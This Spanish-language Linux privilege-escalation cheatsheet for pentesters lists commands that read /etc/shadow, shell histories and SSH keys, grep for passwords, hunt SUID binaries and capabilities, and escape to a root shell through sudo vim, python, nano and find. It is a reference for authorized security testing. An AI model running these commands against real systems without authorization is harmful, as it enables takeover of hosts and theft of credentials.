---
title: "Linux Privilege Escalation Cheatsheet"
description: "Guía completa de técnicas y comandos para escalada de privilegios en sistemas Linux. Incluye enumeración, explotación de SUID, capabilities, kernel exploits y más."
category: "cheatsheets"
tags: ["linux", "privilege-escalation", "pentesting", "enumeration", "suid", "sudo"]
---

# Linux Privilege Escalation Cheatsheet

Guía rápida de referencia para escalada de privilegios en sistemas Linux durante pentesting.

## Enumeración del Sistema

```bash
# Información del sistema
uname -a
cat /etc/issue
cat /etc/*-release

# Información del kernel
cat /proc/version
uname -r

# Variables de entorno
env
echo $PATH

# Usuarios y grupos
whoami
id
cat /etc/passwd
cat /etc/group
cat /etc/shadow  # Si tienes permisos
```

## Búsqueda de SUID/SGID

```bash
# Archivos con SUID
find / -perm -4000 -type f 2>/dev/null

# Archivos con SGID
find / -perm -2000 -type f 2>/dev/null

# Archivos con capabilities
getcap -r / 2>/dev/null
```

## Sudo y Permisos

```bash
# Comandos que puedes ejecutar como sudo
sudo -l

# Historial de sudo
cat /var/log/auth.log | grep sudo
```

## Capabilities Explotables

```bash
# Listar capabilities
getcap -r / 2>/dev/null

# Capabilities comunes explotables
# cap_setuid - Permite cambiar UID
# cap_dac_override - Bypass permisos de archivos
# cap_sys_admin - Permisos administrativos
```

## Cron Jobs

```bash
# Crontabs del sistema
cat /etc/crontab
ls -la /etc/cron.*

# Crontabs de usuarios
crontab -l
ls -la /var/spool/cron/crontabs/
```

## Servicios y Procesos

```bash
# Servicios en ejecución
ps aux
ps -ef
systemctl list-units --type=service

# Procesos ejecutándose como root
ps aux | grep root
```

## Archivos y Directorios Sensibles

```bash
# Archivos con contraseñas
grep -r "password" /etc/ 2>/dev/null
grep -r "pass" /var/log/ 2>/dev/null

# Historial de comandos
cat ~/.bash_history
cat ~/.zsh_history

# Claves SSH
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
```

## Kernel Exploits

```bash
# Buscar exploits conocidos
searchsploit "Linux Kernel"
searchsploit "Linux Kernel 4.4"  # Versión específica

# Compilar exploit
gcc -o exploit exploit.c
```

## Herramientas de Enumeración Automática

```bash
# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh

# Linux Smart Enumeration
./lse.sh

# pspy - Monitor de procesos sin root
./pspy64
```

## GTFOBins - Bypass Sudo/SUID

Consulta [GTFOBins](https://gtfobins.github.io/) para técnicas específicas de cada binario.

Ejemplos comunes:

```bash
# vim con sudo
sudo vim -c ':!/bin/bash'

# find con SUID
find . -exec /bin/bash -p \;

# python con sudo
sudo python -c 'import os; os.system("/bin/bash")'

# nano con sudo
sudo nano
^R^X
reset; bash 1>&0 2>&0
```

## Recursos Adicionales

- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [GTFOBins](https://gtfobins.github.io/)
